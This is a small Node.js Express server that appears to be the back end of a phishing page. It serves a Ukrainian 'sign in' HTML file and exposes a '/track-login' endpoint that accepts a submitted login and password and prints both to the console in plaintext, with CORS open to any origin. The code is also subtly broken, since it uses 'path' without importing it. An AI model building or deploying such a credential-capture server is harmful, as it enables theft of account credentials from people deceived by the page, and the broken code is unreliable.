const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");

const app = express();
const PORT = 10000;

app.use(cors());
app.use(bodyParser.json());

app.post("/track-login", (req, res) => {
    const { login, password } = req.body;

		console.log("Success!")
    console.log("Login:", login);
    console.log("Password:", password);

    res.json({ message: "Дані отримані успішно!" });
});

app.get("/", (req, res) => {
    console.log("Get req");
    res.sendFile(path.join(__dirname, "Увійти.html"));
});

app.listen(PORT, () => {
    console.log(`Server is running http://localhost:${PORT}`);
});
